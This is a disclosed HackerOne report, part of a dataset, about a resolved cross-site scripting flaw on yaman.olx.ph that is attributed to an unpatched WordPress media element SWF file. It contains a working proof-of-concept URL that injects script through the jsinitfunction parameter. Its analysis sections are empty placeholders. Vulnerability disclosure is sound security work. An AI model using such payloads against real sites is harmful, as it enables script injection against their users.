---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '150565'
original_report_id: '150565'
title: XSS @ yaman.olx.ph
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-07-11T11:38:33.846Z'
disclosed_at: '2016-07-13T14:46:37.085Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS @ yaman.olx.ph

## Metadata

- HackerOne Report ID: 150565
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-07-13T14:46:37.085Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hey,
Just found your site yaman.olx.ph vulnerable to XSS probably because you're still using an unpatched wordpress version.

**PoC**
http://yaman.olx.ph/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert%60xss%20by%20zawad%60

Hope you resolve it!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
